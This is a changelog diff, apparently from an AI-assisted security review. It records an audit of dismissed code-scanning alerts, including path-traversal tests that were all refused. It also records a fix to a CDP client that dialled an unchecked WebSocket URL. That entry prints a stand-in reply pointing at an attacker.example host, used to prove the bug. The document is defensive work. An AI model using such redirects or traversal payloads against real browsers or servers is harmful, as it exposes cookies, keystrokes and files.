@@ -1,5 +1,63 @@
 ## Unreleased
 
+### Audit of 200 dismissed code-scanning alerts, and one they hid
+
+The operator asked whether alerts closed by earlier agents were closed
+too easily. Two hundred dismissals, checked by execution rather than by
+reading the justification.
+
+Almost all hold up. The 109 `DS162092` ("accessing localhost") are the
+bridge's architecture, not debug code. The seven high-severity
+`py/path-injection` dismissals were re-attacked directly: ten traversal
+payloads against the dashboard asset handler (`../`, encoded dots,
+prefix-sharing sibling directories, a symlink planted inside the asset
+root) and thirteen against `standalone_tools._jail` (absolute paths,
+`~/..`, a symlink inside `$HOME` pointing at `/etc`, blocked basenames)
+-- every one refused. The `contents: write` grants each belong to a job
+whose whole purpose is to push, with `permissions: {}` at the top of
+every workflow. The `js/disabling-certificate-validation` pair pointed at
+a browser extension that really is gone from the repo.
+
+Two justifications were sloppier than the decisions they defended.
+`artipacked` was closed as "persist-credentials: false added to all
+checkout steps"; two of the 35 checkouts still say `true`. They are the
+badge bot and the Dependabot relocker, both of which push, both marked
+with a comment saying so -- the decision was right, the sentence
+describing it was not. Likewise the DevSkim `security-events: write` was
+closed as "removed" while still present and still needed for its SARIF
+upload. Neither is a hole; both are reminders that a dismissal comment is
+a claim, and claims are checkable.
+
+The one real finding was the pin comment: `microsoft/DevSkim-Action` is
+pinned to a SHA that is tag `v1.0.16` while the trailing comment said
+`# v1`, which is what zizmor's `ref-version-mismatch` was pointing at.
+The action is not archived either -- that alert had simply gone stale.
+Comment corrected rather than argued with.
+
+### A CDP debug endpoint could choose where the client connects
+
+`arena/browser/cdp_client/` asks the browser's HTTP debug port for a tab
+list and connects to the `webSocketDebuggerUrl` it finds. That URL came
+out of a JSON body and was dialled unchecked. Verified by execution: a
+stand-in listening on the CDP port answered
+
+    {"type": "page", "webSocketDebuggerUrl":
+     "ws://attacker.example:9999/devtools/page/STOLEN"}
+
+and `get_websocket_url` returned it for `AsyncCDPBrowser.connect` to
+open. A CDP socket reads every page, every cookie and every keystroke in
+the browser, so where it points is not a detail.
+
+The request always goes to `http://127.0.0.1:<port>`, so the reply is now
+only trusted to *name a tab on that port*: `ws`/`wss`, loopback host,
+matching port. Anything else returns None, which surfaces as the existing
+"Cannot connect to browser CDP on port N".
+
+Whether an attacker can control that reply is a fair question and the
+answer is "sometimes" -- any local process can bind a free port, and
+`--remote-debugging-port` values are guessable. Cheap to close, so
+closed.
+
 ### An ASR "download" could read local files
 
 `arena/mcp/tool_asr.py` fetches ffmpeg, whisper.cpp and a model, then runs
